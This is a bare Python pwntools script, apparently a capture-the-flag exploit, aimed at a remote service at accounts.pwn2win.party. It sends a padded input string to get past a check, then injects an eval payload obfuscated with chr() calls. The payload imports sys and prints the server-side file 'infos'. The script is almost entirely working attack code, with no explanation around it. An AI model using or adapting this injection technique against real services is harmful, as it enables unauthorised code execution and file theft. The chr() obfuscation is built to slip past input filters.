from pwn import *

context.log_level="DEBUG"
r=remote("accounts.pwn2win.party",3760)
r.sendline("Fideleeto1926zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz|ZZZZZZZZZZZZZZz")
while True:
    l=r.recvline()
    if l.find("Exit")>-1:
        break
r.sendline("110")
r.sendline("__import__(chr(115)+chr(121)+chr(115)).stdout.write(open(chr(105)+chr(110)+chr(102)+chr(111)+chr(115)).read())")
while True:
    print r.recvline()
r.interactive()
